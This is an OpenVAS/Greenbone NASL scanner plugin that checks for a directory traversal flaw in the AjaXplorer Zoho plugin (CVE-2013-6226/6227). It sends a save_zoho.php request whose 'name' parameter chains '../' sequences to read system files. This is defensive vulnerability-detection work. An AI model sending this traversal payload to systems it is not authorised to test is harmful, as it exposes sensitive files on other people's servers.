# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ajaxplorer:ajaxplorer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803970");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2013-6226", "CVE-2013-6227");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-11-26 12:27:43 +0530 (Tue, 26 Nov 2013)");
  script_name("AjaXplorer Zoho plugin < 5.0.4 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ajaxplorer_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ajaxplorer/http/detected");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88667");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63647");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63662");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88668");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2013-11/0043.html");

  script_tag(name:"summary", value:"The Zoho plugin of AjaXplorer is prone to a directory traversal
  and a file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaws exist due to improper validation of user-supplied
  input via the 'name' parameter and improper validation of file extensions by the save_zoho.php
  script.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive
  information, and upload a malicious PHP script, which could allow the attacker to execute
  arbitrary PHP code on the affected system.");

  script_tag(name:"affected", value:"AjaXplorer Zoho plugin 5.0.3 and prior.");

  script_tag(name:"solution", value:"Update the Zoho plugin to version 5.0.4 or later.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = dir + "/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=" + crap(data:"../", length:3*15) + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
